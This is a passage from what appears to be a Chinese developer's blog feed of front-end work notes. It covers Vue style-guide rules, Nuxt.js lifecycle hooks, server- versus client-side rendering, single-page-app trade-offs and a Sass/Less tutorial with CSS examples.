class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完整单词组件名">完整单词组件名<a title="#完整单词组件名" href="#完整单词组件名"></a></h3><p>组件名应该倾向于完整单词而不是缩写。</p><p>编辑器中的自动补全已经让书写长命名的代价非常之低了，而其带来的明确性却是非常宝贵的。不常用的缩写尤其应该避免。</p><h3 id="prop名-大小写">prop名 大小写<a title="#prop名-大小写" href="#prop名-大小写"></a></h3><p>在声明 prop 的时候，其命名应该始终使用 camelCase，而在模板和 JSX 中应该始终使用 kebab-case。</p><p><strong>我们单纯的遵循每个语言的约定。在 JavaScript 中更自然的是 camelCase。而在 HTML 中则是 kebab-case。</strong></p><h3 id="多-attr-元素">多 attr 元素<a title="#多-attr-元素" href="#多-attr-元素"></a></h3><p>多个 attribute 的元素应该分多行撰写，每个 attribute 一行。</p><p>在 JavaScript 中，用多行分隔对象的多个 property 是很常见的最佳实践，因为这样更易读。模板和 JSX 值得我们做相同的考虑。</p><h3 id="模版中简单表达式">模版中简单表达式<a title="#模版中简单表达式" href="#模版中简单表达式"></a></h3><p>组件模板应该只包含简单的表达式，复杂的表达式则应该重构为计算属性或方法。</p><p>复杂表达式会让你的模板变得不那么声明式。我们应该尽量描述应该出现的是什么，而非如何计算那个值。而且计算属性和方法使得代码可以重用。</p><h3 id="简单计算属性">简单计算属性<a title="#简单计算属性" href="#简单计算属性"></a></h3><p>应该把复杂计算属性分割为尽可能多的更简单的 property。</p><blockquote><p>易于测试、易于阅读、更好的“拥抱变化”</p></blockquote><h3 id="带引号的-attr-值">带引号的 attr 值<a title="#带引号的-attr-值" href="#带引号的-attr-值"></a></h3><p>非空 HTML attribute 值应该始终带引号 (单引号或双引号，选你 JS 里不用的那个)。</p><p>在 HTML 中不带空格的 attribute 值是可以没有引号的，但这鼓励了大家在特征值里不写空格，导致可读性变差。</p><h3 id="指令缩写">指令缩写<a title="#指令缩写" href="#指令缩写"></a></h3><p>指令缩写 (用 : 表示 v-bind:、用 @ 表示 v-on: 和用 # 表示 v-slot:) 应该要么都用要么都不用。</p><h2 id="优先级-c">优先级 C<a title="#优先级-c" href="#优先级-c"></a></h2><h3 id="组件/实例的选项顺序">组件/实例的选项顺序<a title="#组件/实例的选项顺序" href="#组件/实例的选项顺序"></a></h3><p>推荐</p><ol><li>副作用 - 触发组件外的影响<ul><li>el</li></ul></li><li>全局感知 - 要求组件外的知识<ul><li>name</li><li>parent</li></ul></li><li>组件类型 - 更改组件类型<ul><li>functional</li></ul></li><li>模版修改器 - 改变模版的编译方式<ul><li>delimiters</li><li>comments</li></ul></li><li>模版依赖 - 模版内使用的资源<ul><li>components</li><li>directives</li><li>filters</li></ul></li><li>组合 - 向选项里合并 property<ul><li>extends</li><li>mixins</li></ul></li><li>接口 - 组件接口<ul><li>inheritAttrs</li><li>model</li><li>props/propsData</li></ul></li><li>本地状态 - 本地响应式 property<ul><li>data</li><li>computed</li></ul></li><li>事件 - 通过响应式事件触发的回调函数<ul><li>watch</li><li>生命周期钩子</li></ul></li><li>非响应式的 property - 不依赖响应式系统的 property<ul><li>methods</li></ul></li><li>渲染 - 组件输出声明描述<ul><li>template/render</li><li>renderError</li></ul></li></ol><h3 id="元素-attr-顺序">元素 attr 顺序<a title="#元素-attr-顺序" href="#元素-attr-顺序"></a></h3><ol><li>定义 - 提供组件的选项<ul><li>is</li></ul></li><li>列表渲染<ul><li>v-for</li></ul></li><li>条件渲染<ul><li>v-if</li><li>v-else-if</li><li>v-else</li><li>v-show</li><li>v-cloak</li></ul></li><li>渲染方式<ul><li>v-pre</li><li>v-once</li></ul></li><li>全局感知 - 需要超越组件的知识<ul><li>id</li></ul></li><li>唯一的attr<ul><li>ref</li><li>key</li></ul></li><li>双向绑定<ul><li>v-model</li></ul></li><li>其他 attr - 所有普通的绑定或未绑定的 attr</li><li>事件<ul><li>v-on</li></ul></li><li>内容<ul><li>v-html</li><li>v-text</li></ul></li></ol><h3 id="组件/实例选项中的空行">组件/实例选项中的空行<a title="#组件/实例选项中的空行" href="#组件/实例选项中的空行"></a></h3><p>你可能想在多个 property 之间增加一个空行，特别是在这些选项一屏放不下，需要滚动才能都看到的时候。</p><p>当你的组件开始觉得密集或难以阅读时，在多个 property 之间添加空行可以让其变得容易。在一些诸如 Vim 的编辑器里，这样格式化后的选项还能通过键盘被快速导航。</p><h3 id="单文件组件的顶级元素的顺序">单文件组件的顶级元素的顺序<a title="#单文件组件的顶级元素的顺序" href="#单文件组件的顶级元素的顺序"></a></h3><p>单文件组件应该总是让 <code>&lt;script&gt;</code>、<code>&lt;template&gt;</code> 和 <code>&lt;style&gt;</code> 标签的顺序保持一致。且 <code>&lt;style&gt;</code> 要放在最后，因为另外两个标签至少要有一个。</p><h2 id="优先级d-谨慎使用">优先级D 谨慎使用<a title="#优先级d-谨慎使用" href="#优先级d-谨慎使用"></a></h2><h3 id="不在-v-if/v-else-if/v-else-➕-key">不在 v-if/v-else-if/v-else ➕ key<a title="#不在-v-if/v-else-if/v-else-➕-key" href="#不在-v-if/v-else-if/v-else-➕-key"></a></h3><p>如果一组 v-if + v-else 的元素类型相同，最好使用 key (比如两个 <div> 元素)。</p><p>默认情况下，Vue 会尽可能高效的更新 DOM。这意味着其在相同类型的元素之间切换时，会修补已存在的元素，而不是将旧的元素移除然后在同一位置添加一个新元素。如果本不相同的元素被识别为相同，则会出现意料之外的结果。</p><h3 id="scoped-避免出现元素选择器">scoped 避免出现元素选择器<a title="#scoped-避免出现元素选择器" href="#scoped-避免出现元素选择器"></a></h3><p>在 scoped 样式中，类选择器比元素选择器更好，因为大量使用元素选择器是很慢的。</p><h3 id="隐性父子组件通信">隐性父子组件通信<a title="#隐性父子组件通信" href="#隐性父子组件通信"></a></h3><p>应该优先通过 prop 和事件进行父子组件之间的通信，而不是 this.$parent 或变更 prop。</p><p>一个理想的 Vue 应用是 prop 向下传递，事件向上传递的。遵循这一约定会让你的组件更易于理解。然而，在一些边界情况下 prop 的变更或 this.$parent 能够简化两个深度耦合的组件。</p><p>问题在于，这种做法在很多简单的场景下可能会更方便。但请当心，不要为了一时方便 (少写代码) 而牺牲数据流向的简洁性 (易于理解)。</p><h3 id="非-flux-的全局状态管理">非 flux 的全局状态管理<a title="#非-flux-的全局状态管理" href="#非-flux-的全局状态管理"></a></h3><p>应该优先通过 Vuex 管理全局状态，而不是通过 this.$root 或一个全局事件总线。</p><p>通过 this.$root 和/或全局事件总线管理状态在很多简单的情况下都是很方便的，但是并不适用于绝大多数的应用。</p><p>Vuex 是 Vue 的官方类 flux 实现，其提供的不仅是一个管理状态的中心区域，还是组织、追踪和调试状态变更的好工具。它很好地集成在了 Vue 生态系统之中 (包括完整的 Vue DevTools 支持)。</p>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nuxtjs 的生命周期</title>
      <link href="/workNotes/work/04%20nuxtjs%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"/>
      <url>/workNotes/work/04%20nuxtjs%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F</url>
      
        <content type="html"><![CDATA[<h2 id="asyncdata">asyncData<a title="#asyncdata" href="#asyncdata"></a></h2><blockquote><p>可能想要在服务器端获取并渲染数据。Nuxt.js添加了asyncData方法使得你能够在渲染组件之前异步获取数据。</p></blockquote><p>asyncData 是最常用最重要的生命周期，同时也是服务端渲染的关键点。<br>该生命周期只限于页面组件调用，第一个参数为 context。<br>它调用的时机在组件初始化之前，运作在服务端环境。<br>所以在 asyncData 生命周期中，我们<strong>无法通过 this 引用当前的 Vue 实例</strong>，也<strong>没有 window 对象和 document 对象</strong>，这些是我们需要注意的。<br>一般在 asyncData 会对主要<strong>页面数据进行预先请求</strong>，获取到的数据会交由服务端拼接成 html 返回前端渲染，以此提高首屏加载速度和进行 seo 优化。</p><h2 id="fecth">fecth<a title="#fecth" href="#fecth"></a></h2><blockquote><p>用于在渲染页面前填充应用的状态树（store）数据， 与 asyncData 方法类似，不同的是它<strong>不会设置组件的数据。</strong></p></blockquote><p>得知该生命周期用于填充 Vuex 状态树，与 asyncData 同样，它在组件初始化前调用，第一个参数为 context。但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。</p><h2 id="validate">validate<a title="#validate" href="#validate"></a></h2><blockquote><p>但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。</p></blockquote><p>在验证路由参数合法性时，它能够帮助我们，第一个参数为 context。与上面有点不同的是，我们能够访问实例上的方法 <a href="http://this.methods.xxx">this.methods.xxx</a>。</p><h2 id="watchquery">watchQuery<a title="#watchquery" href="#watchquery"></a></h2><blockquote><p>监听参数字符串更改并在更改时执行组件方法 (asyncData, fetch, validate, layout, …)</p></blockquote><p>watchQuery 可设置 Boolean 或 Array (默认: [])。使用 watchQuery 属性可以监听参数字符串的更改。 如果定义的字符串发生变化，将调用所有组件方法(asyncData, fetch, validate, layout, …)。 为了提高性能，默认情况下禁用。<br>使用 watchQuery有点好处就是，当我们使用浏览器后退按钮或前进按钮时，页面数据会刷新，因为参数字符串发生了变化。</p><h2 id="head">head<a title="#head" href="#head"></a></h2><blockquote><p>Nuxt.js 使用了 vue-meta 更新应用的 头部标签(Head) 和 html 属性。</p></blockquote><p>使用 head 方法设置当前页面的头部标签，该方法里能通过 this 获取组件的数据。<br>除了好看以外，正确的设置 meta 标签，还能有利于页面被搜索引擎查找，进行 seo 优化。<br>一般都会设置 description(简介) 和 keyword(关键词)。</p><h2 id="生命周期的调用顺序">生命周期的调用顺序<a title="#生命周期的调用顺序" href="#生命周期的调用顺序"></a></h2><p>validate  =&gt;  asyncData  =&gt;  fetch  =&gt;  head</p><blockquote><p>参考链接 <a href="https://juejin.cn/post/6844904160324747278#heading-12">https://juejin.cn/post/6844904160324747278#heading-12</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssr - Server Side Render</title>
      <link href="/workNotes/work/03%20ssr"/>
      <url>/workNotes/work/03%20ssr</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：<a href="https://juejin.cn/post/7002198277462442014">https://juejin.cn/post/7002198277462442014</a></p></blockquote><p>服务端渲染 ssr，是指一种传统的渲染开发方式，就是在页面请求url的时候，<strong>服务端将我们需要的 html 文本组装好，并返回给浏览器</strong>，这个HTML文本被浏览器解析之后，不需要<strong>经过 JavaScript 脚本的执行，即可直接构建出希望的 DOM 树</strong>并展示到页面中。</p><p>ssr 有两种模式，单页面 和 非单页面 模式</p><ul><li>单页面：后端首次渲染的单页面应用</li><li>非单页面：完全使用后端路由的后端模版渲染模式</li></ul><blockquote><p>区别于 使用后端路由的程度</p></blockquote><h2 id="csr---client-side-render">csr - Client Side Render<a title="#csr---client-side-render" href="#csr---client-side-render"></a></h2><p>csr与ssr其对应的，一种目前流行的渲染方式，它<strong>依赖的是运行在客户端的JS</strong>，用户首次发送请求<strong>只能得到小部分的指引性HTML代码</strong>。第二次请求将会请求更多包含HTML字符串的JS文件。</p><h2 id="需要ssr的原因">需要ssr的原因<a title="#需要ssr的原因" href="#需要ssr的原因"></a></h2><p>SPA应用的<strong>首屏打开速度很慢</strong>，因为用户首次加载需要先下载SPA框架及应用程序的代码，然后再渲染页面，且 <strong>SPA 应用不利于 SEO 优化</strong>。</p><p>想着是不是可以<strong>将应用首页先加载出来，然后让首页用不到的其他 JS 文件再慢慢加载</strong>。但是由于 JS 引擎是单线程的，数据的组装过程会受到阻塞，单靠浏览器端的话不容易实现。</p><p>SSR 契机就在此，如果<strong>将组装数据、渲染 HTML 页面的过程放在服务端</strong>，而<strong>浏览器端只负责显示接收到的 HTML 文</strong>件，那首屏的打开速度无疑会快很多。</p><h2 id="优缺点">优缺点<a title="#优缺点" href="#优缺点"></a></h2><ul><li>优点<ul><li><strong>更快的响应时间</strong>，相对于客户端渲染，服务端渲染在浏览器请求URL之后已经<strong>得到了一个带有数据的HTML文本</strong>，浏览器只需要解析HTML，直接构建DOM树就可以</li><li><strong>有利于 SEO</strong> ，可以<strong>将 SEO 的关键信息直接在后台就渲染成 HTML，而保证搜索引擎的爬虫都能爬取到关键数据</strong>，然后在别人使用搜索引擎搜索相关的内容时，你的网页排行能靠得更前，这样你的流量就有越高。</li></ul></li><li>缺点<ul><li>相<strong>对于只需要提供静态文件的服务器</strong>，SSR中使用的渲染程序自然会<strong>占用更多的CPU和内存资源</strong></li><li>一些<strong>常用的浏览器API可能无法正常使用</strong>，比如<code>window</code>、<code>docment</code>和<code>alert</code>等，如果使用的话需要对运行的环境加以判断</li><li>开发调试会有一些麻烦，因为涉及了浏览器及服务器，对于<strong>SPA的一些组件的生命周期的管理会变得复杂</strong></li><li>可能会由于某些因素导致服务器端渲染的结果与浏览器端的<strong>结果不一致</strong></li></ul></li><li>总结<ul><li>最适用于静态展示页面，如果页面动态数据较多时需要谨慎使用。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单页面应用</title>
      <link href="/workNotes/work/02%20spa%E4%BC%98%E7%BC%BA%E7%82%B9"/>
      <url>/workNotes/work/02%20spa%E4%BC%98%E7%BC%BA%E7%82%B9</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：<a href="https://juejin.cn/post/6950100237985775623">https://juejin.cn/post/6950100237985775623</a></p></blockquote><p>单页面应用程序将所有的活动局限于一个Web页面中，在该Web页面初始化时加载相应的HTML、JavaScript 和 CSS。一旦页面加载完成，单页面应用不会因为用户的操作而进行页面的重新加载或跳转。取而代之的是利用 JavaScript 动态的变换HTML的内容，从而实现UI与用户的交互。由于避免了页面的重新加载，单页面应用可以提供较为流畅的用户体验。</p><h2 id="1.-优点">1. 优点<a title="#1.-优点" href="#1.-优点"></a></h2><ul><li>良好的交互体验<br>内容改变不需要重新加载整个页面，获取数据通过 ajax 异步获取，没有页面之间的切换，不会在跳转的时候出现 “白屏现象”，页面显示流畅。</li><li>良好的前后端工作分离模式<br>后端不负责模版渲染、输出页面工作，后端 api 通用化</li><li>减轻服务器压力<br>相对服务器压力小，服务器只用出数据就可以，不用管展示逻辑和页面合成，吞吐能力提高</li></ul><h2 id="2.-缺点">2. 缺点<a title="#2.-缺点" href="#2.-缺点"></a></h2><ul><li><p>首屏加载慢<br>解决：</p><ol><li>vue-router 懒加载<br>vue-router 是按需加载组件，只有当路由被访问时才会加载对应组件，而不是在加载首页时加载，项目越大，对首屏加载的速度提升得越明显</li><li>使用 cdn 加速<br>在做项目时，我们会用到很多库，采用cdn可以加快加载速度</li><li>异步加载组件</li><li>服务端渲染<br>也对 seo 优化起到作用，有利于搜索引擎抓取更多信息r<br>如果页面纯 前端渲染，搜索引擎抓取到的就只是空页面</li></ol></li><li><p>不利于 seo</p><blockquote><p>seo 本质是 一个服务器向另一个服务器发请求，解析请求内容。<br>但一般来说搜索引擎是不会去执行请求到 js 的，即  <strong>搜索引擎的基础爬虫的原理就是抓取 url，然后获取 html 源代码并解析</strong><br>如果是一个 spa ，html 在浏览器才渲染出数据， <strong>seo 请求到的html 是模型页面 而不是 最终数据的 渲染页面</strong>，这样就不利于内容被搜索引擎搜到</p></blockquote><p>解决：</p><ol><li>服务端渲染 ssr<br>服务器合成完整的 html 文件再输出到浏览器</li><li>页面预渲染</li><li>路由采用 h5 history模式</li></ol></li><li><p>不适合开发大型项目</p><blockquote><p>有可能涉及大量 dom 操作、复杂动画效果</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sass -- css 预处理器</title>
      <link href="/workNotes/work/01%20scss%20sass"/>
      <url>/workNotes/work/01%20scss%20sass</url>
      
        <content type="html"><![CDATA[<blockquote><p>2022.02.18 在公司熟悉环境时看到用的 cass 所以先去了解</p><p>参考网站 <a href="https://www.sass.hk/guide/">https://www.sass.hk/guide/</a></p><p>介绍：<a href="https://juejin.cn/post/6844904169313140749">https://juejin.cn/post/6844904169313140749</a></p><p>简洁区别：<a href="https://juejin.cn/post/6844904086676963341">https://juejin.cn/post/6844904086676963341</a></p></blockquote><h1 id="sass-css-预处理器">sass css 预处理器<a title="#sass-css-预处理器" href="#sass-css-预处理器"></a></h1><p>CSS 预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为 CSS 增加了一些编程的特性，将 CSS 作为目标生成文件，然后开发者就只要使用这种语言进行CSS的编码工作。</p><h2 id="0.1-使用-预处理器的原因">0.1 使用 预处理器的原因<a title="#0.1-使用-预处理器的原因" href="#0.1-使用-预处理器的原因"></a></h2><p>CSS仅仅是一个标记语言，不可以自定义变量，不可以引用。<br><strong>CSS有具体以下几个缺点：</strong></p><ul><li>语法不够强大，比如无法嵌套书写，导致模块化开发中需要书写很多重复的选择器；</li><li>没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护。</li><li>预编译很容易造成后代选择器的滥用</li></ul><p><strong>使用预处理器的优点:</strong></p><ul><li>提供CSS层缺失的样式层复用机制</li><li>减少冗余代码</li><li>提高样式代码的可维护性</li></ul><p>Sass 和 Less 这类语言，其实可以理解成 <strong>CSS 的超集</strong>，它们在CSS 原本的语法格式基础上，增加了编程语言的特性，如变量的使用、逻辑语句的支持、函数等。让 CSS 代码更容易维护和复用。</p><p>但浏览器最终肯定是只认识 CSS 文件的，它无法处理 CSS 中的那些变量、逻辑语句，<strong>所以需要有一个编译的过程，将 Sass 或 Less 写的代码转换成标准的 CSS 代码，这个过程就称为 CSS 预处理。</strong></p><h2 id="0.2-less-&amp;-sass">0.2 less &amp; sass<a title="#0.2-less-&amp;-sass" href="#0.2-less-&amp;-sass"></a></h2><ul><li><p>Less （Leaner Style Sheets 的缩写） 是一门向后兼容的 CSS 扩展语言。因为 Less 和 CSS 非常像，<strong>Less 仅对 CSS 语言增加了少许方便的扩展，学习很容易</strong> .</p></li><li><p>sass，作为”世界上最成熟、最稳定、最强大的专业级CSS扩展语言”。<strong>兼容所有版本的css，且有无数框架使用sass构建</strong>，如Compass，Bourbon，和Susy。</p></li></ul><blockquote><p>SASS版本3.0之前的后缀名为.sass，而版本3.0之后的后缀名.scss。</p></blockquote><p><strong>相同之处：</strong><br>1、混入(Mixins)—class中的class；<br>2、参数混入—可以传递参数的class，就像函数一样；<br>3、嵌套规则—Class中嵌套class，从而减少重复的代码；<br>4、运算—CSS中用上数学；<br>5、颜色功能—可以编辑颜色；<br>6、名字空间(namespace)—分组样式，从而可以被调用；<br>7、作用域—局部修改样式；<br>8、JavaScript 赋值—在CSS中使用JavaScript表达式赋值。</p><p><strong>不同之处：</strong></p><blockquote><p>sass less</p></blockquote><ul><li><p>环境: dart或其他  |  基于javascript,可以运行在 Node 或浏览器</p></li><li><p>使用: 复杂  |  简单(相对而言)</p></li><li><p>功能: 复杂  |  简单(相对而言)</p></li><li><p>处理机制: 服务端处理  |  可以运行在 Node 或浏览器端<br>变量: 以 $ 开头  |  以 @ 开头<br>文件后缀: .sass 或. scss  |  .less</p></li><li><p>在Less中，<strong>仅允许循环数值</strong>。<br>在Sass中，我们可以<strong>遍历任何类型的数据</strong>。但在Less中，我们只能使用递归函数循环数值。</p></li><li><p>条件语句<br>Less 中并<strong>不支持</strong>条件语句，当然，可以通过内置函数 if 以及 and，or，not 这些来模拟条件语句。<br>在 Sass 中是<strong>支持</strong>条件语句的，但也不是像其他编程语言直接 if 这样通过保留字来编写，需要加个 @ 符号</p></li></ul><h2 id="1.-使用变量">1. 使用变量<a title="#1.-使用变量" href="#1.-使用变量"></a></h2><p>sass 使用 <code>$</code> 作为标识变量</p><blockquote><p>老版的 scss 使用 <code>!</code> 作为标识，改变的原因 – 太丑了 ?</p></blockquote><ol><li>声明 引用 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    $highlight-<span class="attribute">color</span>: <span class="number">#F90</span>;</span><br><span class="line">    <span class="selector-class">.selected</span> &#123;</span><br><span class="line">        <span class="attribute">border</span>: $highlight-border;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2</span>. 变量名用中划线 / 下划线</span><br><span class="line">    随便、爱用啥用啥，且 sass 将其视为一样的，都指向一个变量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## <span class="number">2</span>. 嵌套 css 规则</span><br><span class="line">~~~css </span><br><span class="line">    <span class="selector-id">#content</span> &#123;</span><br><span class="line">        <span class="selector-tag">article</span> &#123;</span><br><span class="line">            <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: <span class="number">#333</span> &#125;</span><br><span class="line">            <span class="selector-tag">p</span> &#123; <span class="attribute">margin-bottom</span>: <span class="number">1.4em</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-tag">aside</span> &#123; <span class="attribute">background-color</span>: <span class="number">#EEE</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="1.1-父选择器标识符-&amp;">1.1 父选择器标识符 <code>&amp;</code><a title="#1.1-父选择器标识符-&amp;" href="#1.1-父选择器标识符-&amp;"></a></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">article</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span> &#123; <span class="attribute">color</span>: red &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译后*/</span></span><br><span class="line"><span class="selector-tag">article</span> <span class="selector-tag">a</span> &#123; <span class="attribute">color</span>: blue &#125;</span><br><span class="line"><span class="selector-tag">article</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; <span class="attribute">color</span>: red &#125;</span><br></pre></td></tr></table></figure><h3 id="1.2-群组选择器-,">1.2 群组选择器 <code>,</code><a title="#1.2-群组选择器-," href="#1.2-群组选择器-,"></a></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span> &#123;<span class="attribute">margin-bottom</span>: .<span class="number">8em</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1.3-子组合选择器和同层组合选择器-&gt;-+-~">1.3 子组合选择器和同层组合选择器 <code>&gt;</code> <code>+</code> <code>~</code><a title="#1.3-子组合选择器和同层组合选择器-&gt;-+-~" href="#1.3-子组合选择器和同层组合选择器-&gt;-+-~"></a></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 子 */</span></span><br><span class="line"><span class="selector-tag">article</span> &gt; <span class="selector-tag">section</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 同层相邻组合 */</span></span><br><span class="line"><span class="selector-tag">header</span> + <span class="selector-tag">p</span> &#123; <span class="attribute">font-size</span>: <span class="number">1.1em</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 同层全体组合 */</span></span><br><span class="line"><span class="selector-tag">article</span> ~ <span class="selector-tag">article</span> &#123; <span class="attribute">border-top</span>: <span class="number">1px</span> dashed <span class="number">#ccc</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="1.4-嵌套属性">1.4 嵌套属性<a title="#1.4-嵌套属性" href="#1.4-嵌套属性"></a></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: &#123;</span><br><span class="line">  style: solid;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ccc</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span> &#123;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3.-导入-sass-文件">3. 导入 sass 文件<a title="#3.-导入-sass-文件" href="#3.-导入-sass-文件"></a></h2><ul><li><p>css 中不常用的特性：<code>@import</code> 规则，它允许在一个<code>css</code> 文件中导入其他 <code>css</code> 文件。然而，后果是<strong>只有执行到 <code>@import</code> 时，浏览器才会去下载其他 <code>css</code> 文件，这导致页面加载起来特别慢。</strong></p></li><li><p>sass也有一个@import规则，但不同的是，sass的@import规则在生成css文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个css文件中，而无需发起额外的下载请求。</p></li></ul><h3 id="3.1-局部文件-/-部分文件">3.1 局部文件 / 部分文件<a title="#3.1-局部文件-/-部分文件" href="#3.1-局部文件-/-部分文件"></a></h3><p>当通过@import把sass样式分散到多个文件时，你通常只想生成少数几个css文件。那些专门为@import命令而编写的sass文件，并不需要生成对应的独立css文件，这样的sass文件称为<strong>局部文件</strong>。</p><p>此约定即，<strong>sass局部文件的文件名以下划线开头</strong>。这样，sass就不会在编译时单独编译这个文件输出css，而只把这个文件用作导入。当你@import一个局部文件时，还可以不写文件的全名，即省略文件名开头的下划线。</p><h3 id="3.2-默认变量值-!default">3.2 默认变量值 <code>!default</code><a title="#3.2-默认变量值-!default" href="#3.2-默认变量值-!default"></a></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$fancybox-<span class="attribute">width</span>: <span class="number">400px</span> !default;</span><br><span class="line"><span class="selector-class">.fancybox</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: $fancybox-width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果用户在导入你的sass局部文件之前声明了一个<code>$fancybox-width</code>变量，那么你的局部文件中对<code>$fancybox-width</code>赋值<code>400px</code>的操作就无效。如果用户没有做这样的声明，则<code>$fancybox-width</code>将默认为<code>400px</code>。</p></blockquote><h3 id="3.3-嵌套导入">3.3 嵌套导入<a title="#3.3-嵌套导入" href="#3.3-嵌套导入"></a></h3><p>跟原生的css不同，sass允许@import命令写在css规则内。这种导入方式下，生成对应的css文件时，局部文件会被直接插入到css规则内导入它的地方</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  blue-theme 文件 */</span></span><br><span class="line"><span class="selector-tag">aside</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: blue;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用文件 */</span></span><br><span class="line"><span class="selector-class">.blue-theme</span> &#123;<span class="keyword">@import</span> <span class="string">&quot;blue-theme&quot;</span>&#125;</span><br><span class="line">.blue-theme &#123;</span><br><span class="line">  <span class="selector-tag">aside</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.4-原生-css-导入">3.4 原生 css 导入<a title="#3.4-原生-css-导入" href="#3.4-原生-css-导入"></a></h3><p>由于sass兼容原生的css，所以它也支持原生的CSS 